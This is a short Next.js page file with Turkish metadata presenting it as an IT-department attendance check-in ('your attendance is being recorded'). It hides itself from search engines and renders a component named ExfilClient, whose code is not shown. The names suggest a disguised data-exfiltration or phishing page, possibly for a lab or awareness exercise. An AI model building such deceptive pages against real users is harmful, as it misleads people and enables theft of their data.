import type { Metadata } from "next";
import { ExfilClient } from "./ExfilClient";

export const metadata: Metadata = {
  title: "Yoklama İmzası · Bilgi Teknolojileri",
  description: "Yoklamanız kaydediliyor.",
  robots: { index: false, follow: false },
};

export default function Page() {
  return <ExfilClient />;
}
